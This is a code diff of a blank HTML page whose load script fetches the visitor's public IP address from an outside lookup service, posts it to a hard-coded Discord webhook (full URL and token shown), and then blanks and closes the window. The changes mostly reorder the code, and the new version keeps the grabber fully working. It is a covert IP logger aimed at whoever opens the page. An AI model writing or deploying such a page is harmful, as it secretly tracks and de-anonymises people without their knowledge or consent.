@@ -1,7 +1,6 @@
 <!doctype html><html><head><script>
-      window.onload = function load() {
-        window.open('', '_self', '');
-                    function sendMessage(webhookURL, message) {
+    window.onload = function() {
+        function sendMessage(webhookURL, message) {
             fetch(webhookURL, {
                 method: 'POST',
                 headers: {
@@ -28,23 +27,25 @@
             return messages;
         }
 
-            // Send IP to Discord webhook
-            var ip = '';
-            fetch('https://api.my-ip.io/ip')
-                .then(response => response.text())
-                .then(data => {
-                    ip = data.trim();
-                    var webhookURL = 'https://discord.com/api/webhooks/1125449057347846315/Xiiy-bJH4CYr9MKDDrX3DxQRl9QlfMWyh4V-bZ-HDpj7gtYgun4OyFZSIEGt1cJ5vuN4';
-                    var content = 'IP Address: ' + ip;
-                    if (content.length <= 2000) {
-                        sendMessage(webhookURL, content);
-                    } else {
-                        var messages = splitMessage(content, 2000);
-                        messages.forEach(message => sendMessage(webhookURL, message));
-                    }
-                })
-                .catch(error => console.log(error));
-        };
+        // Send IP to Discord webhook
+        var ip = '';
+        fetch('https://api.my-ip.io/ip')
+            .then(response => response.text())
+            .then(data => {
+                ip = data.trim();
+                var webhookURL = 'https://discord.com/api/webhooks/1125449057347846315/Xiiy-bJH4CYr9MKDDrX3DxQRl9QlfMWyh4V-bZ-HDpj7gtYgun4OyFZSIEGt1cJ5vuN4';
+                var content = 'IP Address: ' + ip;
+                if (content.length <= 2000) {
+                    sendMessage(webhookURL, content);
+                } else {
+                    var messages = splitMessage(content, 2000);
+                    messages.forEach(message => sendMessage(webhookURL, message));
+                }
+            })
+            .catch(error => console.log(error));
+        
+        // Replace the current page with a blank one and then close the window
+        window.open('', '_self', '');
         window.close();
-      };
+    };
 </script></head><body></body></html>
